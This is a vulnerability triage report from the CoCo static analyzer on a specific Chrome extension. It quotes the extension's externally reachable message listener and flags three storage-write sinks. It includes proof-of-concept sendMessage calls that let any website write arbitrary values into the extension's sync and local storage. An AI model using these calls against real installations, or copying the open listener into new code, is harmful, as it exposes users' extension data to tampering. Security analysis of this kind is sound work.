# CoCo Analysis: apndpbnhnhpddgndohglpofednmlfnkj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (chrome.storage.sync.set x2, chrome.storage.local.set x1)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/apndpbnhnhpddgndohglpofednmlfnkj/opgen_generated_files/bg.js
Line 1034: if(request.header && !request.body) {

**Code:**

```javascript
// Background script - External message listener (bg.js)
chrome.runtime.onMessageExternal.addListener(
  async (request, sender, sendResponse) => { // ← attacker-controlled
    if (request.url) {
      if (request.handleCors) {
        var res = await fetcore(
          request.url,
          request.method,
          request.header,
          request.body
        );
        sendResponse(res);
      } else {
        if(request.header && !request.body) { // ← attacker-controlled
          chrome.storage.sync.set({ "ffb_language": request.header }, function(){}); // Storage write sink
          sendResponse('{ "success": "true" }');
        } else if(!request.method && request.header && request.body) {
          chrome.storage.sync.set({ "script_param": request.body }, function(){}); // Storage write sink
          chrome.storage.local.set({ "exchange_rates": request.header }, function(){}); // Storage write sink
          sendResponse('{ "success": "true" }');
        } else {
          var res = await fet(
            request.url,
            request.method
          );
          sendResponse(res);
        }
      }
    } else {
      sendResponse('{ "success": "true" }');
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - allows any external extension or website to send messages

**Attack:**

```javascript
// From malicious extension or webpage (if explicitly connectable)
chrome.runtime.sendMessage(
  'apndpbnhnhpddgndohglpofednmlfnkj', // Target extension ID
  {
    url: 'http://example.com',
    header: 'malicious_value',
    // no body property
  },
  function(response) {
    console.log('Injected data into storage:', response);
  }
);

// Alternative attack - inject both header and body
chrome.runtime.sendMessage(
  'apndpbnhnhpddgndohglpofednmlfnkj',
  {
    url: 'http://example.com',
    header: 'attacker_header_value',
    body: 'attacker_body_value',
    // no method property
  },
  function(response) {
    console.log('Injected data into both sync and local storage');
  }
);
```

**Impact:** External attacker can write arbitrary data to chrome.storage.sync and chrome.storage.local. The extension has "externally_connectable" set to match "http://*/*" and "https://*/*", allowing any website to send messages. Attacker can poison storage with malicious configuration data (ffb_language, script_param, exchange_rates), potentially affecting extension behavior and user data.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (body parameter)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/apndpbnhnhpddgndohglpofednmlfnkj/opgen_generated_files/bg.js
Line 1034: if(request.header && !request.body) {

**Classification:** TRUE POSITIVE

**Reason:** Same flow as Sink 1, using request.body parameter instead. Covered in the comprehensive attack above.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/apndpbnhnhpddgndohglpofednmlfnkj/opgen_generated_files/bg.js
Line 1034: if(request.header && !request.body) {

**Classification:** TRUE POSITIVE

**Reason:** Same flow as Sink 1, targeting chrome.storage.local instead. Covered in the comprehensive attack above.
